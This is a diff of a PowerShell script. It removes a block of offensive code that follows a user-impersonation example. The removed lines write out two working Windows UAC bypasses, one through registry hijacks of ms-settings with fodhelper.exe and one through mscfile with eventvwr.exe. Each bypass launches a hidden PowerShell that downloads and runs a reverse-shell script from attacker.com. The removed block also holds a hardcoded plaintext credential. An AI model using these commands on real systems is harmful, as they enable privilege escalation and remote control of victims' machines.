@@ -48,18 +48,3 @@ Invoke-ImpersonatedCommand -Username "AdminUser" -Password "YourPasswordHere" -S
     whoami
     # You can put any command here to run as the impersonated user
 }
-
-Start-Process powershell -Credential (New-Object System.Management.Automation.PSCredential("hostname\adminuser", (ConvertTo-SecureString "password" -AsPlainText -Force))) -NoNewWindow
-
-
-# Set registry values to hijack fodhelper.exe
-New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
-Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" "DelegateExecute" ""  # Required empty value
-Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" "(default)" "powershell -NoP -NonI -W Hidden -Command iex(New-Object Net.WebClient).DownloadString('http://attacker.com/revshell.ps1')"
-
-# Launch fodhelper.exe (auto-elevates and triggers your payload)
-Start-Process "C:\Windows\System32\fodhelper.exe"
-
-
-Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "powershell -NoP -W Hidden -Command iex(New-Object Net.WebClient).DownloadString('http://attacker.com/revshell.ps1')"
-Start-Process "eventvwr.exe"
